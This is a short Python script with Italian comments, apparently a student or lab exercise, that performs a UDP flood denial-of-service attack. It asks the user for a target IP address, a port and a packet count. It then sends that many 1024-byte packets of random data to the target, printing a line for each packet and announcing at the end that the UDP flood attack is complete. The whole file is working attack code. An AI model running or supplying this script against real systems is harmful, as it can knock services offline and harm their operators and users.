import socket as so
import os

def Genera_Pacchetti_Random(dim):
    return os.urandom(dim)

# FUNZIONE CHE RICHIEDE 3 PARAMETRI, L'IP, LA PORTA E LA QUAN TITA DI APCCHETTI CHE POI VERRANNO PASSATI TRAMITE INPUT
def Crea_Socket(IP_target, Port_target, num_packets):
   
    # Creare un socket UDP per l'attacco
    Dos = so.socket(so.AF_INET, so.SOCK_DGRAM)
    
    # Definiamo le dimensioni dei pacchetti
    packets_dim = 1024
    
    for i in range(num_packets):
        # Generare un pacchetto di dati casuali di dimensione fissa
        packet = Genera_Pacchetti_Random(packets_dim)
    
        # Inviare il pacchetto al server di destinazione
        Dos.sendto(packet, (IP_target, Port_target))
        
        # Avvisa che il pacchetto è stato inviato
        print(f"Pacchetto {i+1}/{num_packets} inviato a {IP_target}:{Port_target}")
    
    Dos.close()
    print("Attacco UDP Flood completato.")

if __name__ == "__main__":
    # Input dall'utente
    IP_target = input("Inserisci l'indirizzo IP del target: ")
    Port_target = int(input("Inserisci la porta UDP del target: "))
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
    
    # Avvio dell'attacco UDP Flood
    Crea_Socket(IP_target, Port_target, num_packets)